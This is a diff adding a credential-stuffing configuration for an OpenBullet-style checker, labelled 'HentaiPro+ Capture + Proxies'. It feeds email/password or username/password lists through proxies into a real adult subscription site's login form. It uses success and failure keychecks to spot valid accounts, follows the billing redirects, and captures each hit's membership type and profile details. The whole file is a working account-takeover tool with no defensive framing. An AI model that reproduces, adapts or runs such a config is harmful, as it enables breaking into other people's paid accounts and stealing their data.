@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "HentaiPro+ Capture + Proxies",
+  "SuggestedBots": 3,
+  "LastModified": "2018-08-29T02:40:14.7543367+00:00",
+  "AdditionalInfo": "Proxyless coul run with 3 or less bots",
+  "Author": "PaparazziTeam",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL1 REQUEST POST "https://ma.hentaipros.com/access/submit/" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&rememberme=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://ma.hentaipros.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://ma.hentaipros.com/access/login/" 
+#KEY_CHECK1 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY ">Unauthorized attempt!</" 
+    KEY "\">Oops! Seems like the password you entered isn't working.</" 
+  KEYCHAIN Success OR 
+    KEY "<title>Redirecting to https://probiller.com/site/Login/default/domain/www.hentaipros.com" 
+#Hash PARSE "<SOURCE>" LR "<title>Redirecting to https://probiller.com/site/Login/default/domain/www.hentaipros.com/request/" "<" Recursive=FALSE -> VAR "Hash" "" "" 
+#URL2 REQUEST GET "http://probiller.com/site/Login/default/domain/www.hentaipros.com/request/<Hash>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#KEY_CHECK2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<input type=\"hidden\" name=\"response\" value=\"" 
+#Hash2 PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"response\" value=\"" "\"" Recursive=FALSE -> VAR "Hash2" "" "" 
+#URL3 REQUEST POST "https://ma.hentaipros.com/access/error/?postFallback=1" AutoRedirect=TRUE 
+  CONTENT "response=<Hash2>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: http://probiller.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: http://probiller.com/site/Login/default/domain/www.hentaipros.com/request/<Hash>" 
+#KEY_CHECK3 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "data: '" 
+#Hash3 PARSE "<SOURCE>" LR "data: '" "'" Recursive=FALSE -> VAR "Hash3" "" "" 
+#URL4 REQUEST GET "https://ppp.contentdef.com/ui/render?data=<Hash3>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://ma.hentaipros.com/home/" 
+#KEY_CHECK4 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "unlockedNetworks\":" 
+#unlockedNetworks PARSE "<SOURCE>" LR "unlockedNetworks\":" "," Recursive=FALSE -> CAP "unlockedNetworks" "" "" 
+#URL5 REQUEST GET "https://ma.hentaipros.com/member/profile/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://ma.hentaipros.com/home/" 
+#KEY_CHECK5 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "info-membership-details" 
+  KEYCHAIN Retry OR 
+    KEY "<div class=\"login-error\"></div>" 
+#Membership_Type PARSE "<SOURCE>" LR "<dt>" "</dt>" Recursive=TRUE -> CAP "MembershipDetails" "" "" 
+#Data PARSE "<SOURCE>" LR "<dd>" "</dd>" Recursive=TRUE -> CAP "Data" "" "" 
